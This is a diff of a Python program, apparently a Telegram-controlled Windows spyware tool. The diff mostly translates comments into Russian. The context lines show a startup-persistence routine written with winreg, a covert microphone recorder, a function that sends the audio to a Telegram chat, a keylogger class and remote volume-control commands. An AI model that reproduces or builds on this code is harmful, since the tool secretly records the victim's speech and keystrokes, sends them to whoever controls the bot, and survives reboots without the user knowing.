@@ -29,7 +29,7 @@ import sys
 
 import random
 
-#за добовление в автозагрузку
+#для добовление в автозагрузку
 import shutil
 import winreg
 
@@ -47,22 +47,22 @@ from scipy.io.wavfile import write
 import wavio as wv
 from multiprocessing import Process
 
+
 def micro_phone(i):
-    # Sampling frequency
     freq = 44100
-    # Recording duration
+    # Продолжительность записи
     duration = int(i * freq)
-    # Start recorder with the given values
-    # of duration and sample frequency
+    # Запустить рекордер с заданными значениями
+    # длительности и частоты дискретизации
     recording = sd.rec(duration,
                        samplerate=freq, channels=2)
 
-    # Record audio for the given number of seconds
+    # Запись звука в течение заданного количества секунд
     sd.wait()
-    # This will convert the NumPy array to an audio
-    # file with the given sampling frequency
+    # Это преобразует массив NumPy в аудиофайл.
+    # файл с заданной частотой дискретизации
     write("recorded.wav", freq, recording)
-    # Convert the NumPy array to audio file
+    # Преобразование массива NumPy в аудиофайл
     wv.write("recorded.wav", recording, freq, sampwidth=2)
 
 def send_audio(bot, chat_id):
@@ -114,25 +114,24 @@ add_to_startup()
 
 # Функция записи звука с микрофона
 def micro_phone(i):
-    # Sampling frequency
+    # Частота дискретизации
     freq = 44100
-
-    # Recording duration
+    # Продолжительность записи
     duration = i
 
-    # Start recorder with the given values
-    # of duration and sample frequency
+    # Запустить рекордер с заданными значениями
+    # длительности и частоты дискретизации
     recording = sd.rec(int(duration * freq),
                        samplerate=freq, channels=2)
 
-    # Record audio for the given number of seconds
+    # Запись звука в течение заданного количества секунд
     sd.wait()
 
-    # This will convert the NumPy array to an audio
-    # file with the given sampling frequency
+    # Это преобразует массив NumPy в аудио
+    # файл с заданной частотой дискретизации
     write("recorded.wav", freq, recording)
 
-    # Convert the NumPy array to audio file
+    # Преобразование массива NumPy в аудиофайл
     wv.write("recorded.wav", recording, freq, sampwidth=2)
 
 
@@ -182,7 +181,7 @@ def Keylogs():
     if __name__ == '__main__':
         logger = KeyLog()
         logger.main()
-        # input()
+        
 
 #YOUR_TOKEN
 bot = telebot.TeleBot('YOUR_TOREN')
@@ -632,7 +631,7 @@ def get_user_text(message):
             bot.send_message(message.chat.id, "OK")
 
         #управление громкостью 0%, 25%, 50%, 100%
-        #100%
+        #100% громкости
         elif message.text == "set_sound_100%":
             devices = AudioUtilities.GetSpeakers()
             interface = devices.Activate(
@@ -641,7 +640,7 @@ def get_user_text(message):
 
             volume.SetMasterVolumeLevel(-0.0, None)
 
-        # 50%
+        # 50% громкости
         elif message.text == "set_sound_50%":
             devices = AudioUtilities.GetSpeakers()
             interface = devices.Activate(
@@ -650,7 +649,7 @@ def get_user_text(message):
 
             volume.SetMasterVolumeLevel(-9.2, None)
 
-        # 25%
+        # 25% громкости
         elif message.text == "set_sound_25%":
             devices = AudioUtilities.GetSpeakers()
             interface = devices.Activate(
@@ -659,7 +658,7 @@ def get_user_text(message):
 
             volume.SetMasterVolumeLevel(-17.7, None)
 
-        # 10%
+        # 10% громкости
         elif message.text == "set_sound_10%":
             devices = AudioUtilities.GetSpeakers()
             interface = devices.Activate(
@@ -668,7 +667,7 @@ def get_user_text(message):
 
             volume.SetMasterVolumeLevel(-26.0, None)
 
-        # 0%
+        # 0% громкости
         elif message.text == "set_sound_0%":
             devices = AudioUtilities.GetSpeakers()
             interface = devices.Activate(
